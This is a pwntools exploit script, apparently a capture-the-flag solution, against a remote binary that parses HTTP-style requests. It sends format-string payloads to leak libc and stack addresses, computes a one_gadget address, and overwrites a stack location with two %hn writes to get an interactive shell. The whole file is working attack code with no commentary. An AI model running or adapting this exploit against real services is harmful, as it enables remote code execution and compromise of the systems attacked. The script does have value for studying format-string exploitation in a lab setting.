from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux','sp','-h']

string='''POST / HTTP/1.1
Host: 1
User-Agent: M
Accept: te
Accept-Language: e
Accept-Encoding: g
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: a
Content-Length: -1\n
'''
payload=string+'%227$p%14$p'

# p = process("./chall")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p=process('./chall',env={'LD_PRELOAD':'./libc-2.27.so'})

p = remote("47.105.94.48",12435)
libc = ELF("./libc-2.27.so")

# gdb.attach(p,"b *$rebase(0x137D)")


p.recvuntil('> ')
p.sendline(payload)
leak=int(p.recv(14),16)
log.info("leak:"+hex(leak))
stack=int(p.recv(14),16)
log.info("stack:"+hex(stack))
target=stack+(0x7ffc0ba3fca8-0x7ffc0ba3f880)#(0x7ffdbd1704e8-0x7ffdbd1700c0)
log.info("target:"+hex(target))
libc_base = leak - (0x7f33149f8b97-0x7f33149d7000)#0x21bf7
log.info("libc_base:"+hex(libc_base))

malloc_hook = libc_base + libc.sym['__malloc_hook']
log.info("malloc_hook:"+hex(malloc_hook))

one = libc_base + 0x4f3c2#0x4f3d5
log.info("one:"+hex(one))
first = one & 0xffff
log.info("first:"+hex(first))
second = (one>>16)&0xffff+0x10000
log.info("second:"+hex(second))
payload = string +'a'*0x6+("%"+ str(first-6) +"c%42$hn").ljust(0x20,'b')+p64(target)
p.sendline(payload)

payload = string +'a'*0x6+("%"+ str(second-6) +"c%42$hn").ljust(0x20,'b')+p64(target+2)
p.sendline(payload)

p.interactive()